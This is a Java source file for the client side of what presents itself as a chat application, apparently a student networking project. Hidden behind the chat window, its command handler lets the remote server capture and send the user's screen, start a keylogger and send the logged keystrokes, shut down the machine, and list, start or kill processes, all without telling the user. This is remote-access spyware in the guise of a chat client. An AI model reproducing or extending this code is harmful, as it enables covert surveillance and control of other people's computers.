package Client;

import java.io.IOException;
import java.io.Serializable;

import javax.swing.ImageIcon;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.Rectangle;
import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Image;

public class Main {
    static UIManager uiManager;
    static ChatMessageSocket mSocket;
    static KeyLogger keyLogger;
    public static void main(String[] args) {
        keyLogger = new KeyLogger();
        uiManager = new UIManager();
        addEvent();

    }

    static ImageIcon getScreenCapture() {
        try {
            Robot robot = new Robot();
            Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();
            Image screenImg = robot.createScreenCapture(new Rectangle(screen));
            ImageIcon imgIcon = new ImageIcon(screenImg);
            return imgIcon;
        } catch (AWTException e) {
            e.printStackTrace();
        }
        return null;
	}


    static void executeStringCommand(String cmd) {
        if (cmd.equals("_SEND_SCREEN_CAPTURE_")) {
            // System.out.println("SEND CAPTURE");
            mSocket.send(getScreenCapture());
        }
        else if (cmd.matches("_SHUT_DOWN_")) {
            if (TaskManager.shutdown() == true)
                mSocket.send("$-Successful-$" + "shut down");
            else
                mSocket.send("$-Fail-$" + "shut down");
        }
        else if (cmd.matches("_SHOW_KEY_LOG_")) {
            // System.out.println("SEND KEY");
            String keyText = keyLogger.getText();
            mSocket.send("$-Key-$" + keyText);
        }
        else if (cmd.matches("_START_KEY_LOG_")) {
            keyLogger.hook();
        }
        else if (cmd.matches("_STOP_KEY_LOG_")) {
            keyLogger.unhook();
        }
        else if (cmd.matches("_LIST_TASK_")) {
            Object[][] tasks = TaskManager.getTask();
            if (tasks instanceof Serializable) 
                mSocket.send(tasks);
        }
        else if (cmd.matches("_START_TASK_[\\d\\w\\s\\-.,]+")) {
            String appName = cmd.substring(12);
            if (!appName.endsWith(".exe"))
                appName += ".exe";
            if (TaskManager.start(appName) == true)
                mSocket.send("$-Successful-$" + "start " + appName);
            else
                mSocket.send("$-Fail-$" + "start " + appName);
        }
        else if (cmd.matches("_LIST_APP_")) {
            Object[][] apps = TaskManager.getAppRunning();
            if (apps instanceof Serializable)
                mSocket.send(apps);
        }
        else if (cmd.matches("_KILL_TASK_ \\d+")) {
            long id = Long.parseLong(cmd.split(" ")[1]);
            if (TaskManager.killProcess(id) == true)
                mSocket.send("$-Successful-$" + "kill process id " + id);
            else
                mSocket.send("$-Fail-$" + "kill process id " + id);
        }
        else
            uiManager.addMessage(cmd);
    }

    static void startListening() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (mSocket.isActive()) {
                    Object data = mSocket.readData();
                    if (data instanceof String)
                        executeStringCommand((String) data);
                }
            }
        }).start();
    }

    static void addEvent() {
        // connect button
        uiManager.addEvent("Connect", (address) -> {
            if (mSocket == null || !mSocket.isActive()) {
                if (address.matches("\\d+\\.\\d+\\.\\d+\\.\\d+")) {
                    try {
                        mSocket = new ChatMessageSocket(address);
                        
                        // start listening to server msg
                        startListening();
                        uiManager.inform("Successfully connect to server " + address);
                    } catch (IOException e) {
                        uiManager.inform("Fail to connect to server " + address);
                        // e.printStackTrace();
                    }
                }
            }
            else
                uiManager.inform("Connected");
        });

        // send button
        uiManager.addEvent("Send", (msg) -> {
            if (mSocket != null && mSocket.isActive()) {
                if (msg != null && !msg.isEmpty())
                    mSocket.send(msg);
            }
        });

        // exit button
        uiManager.addEvent("Exit", (noArg) -> {
            if (mSocket != null)
                mSocket.close();
        });
    }

}
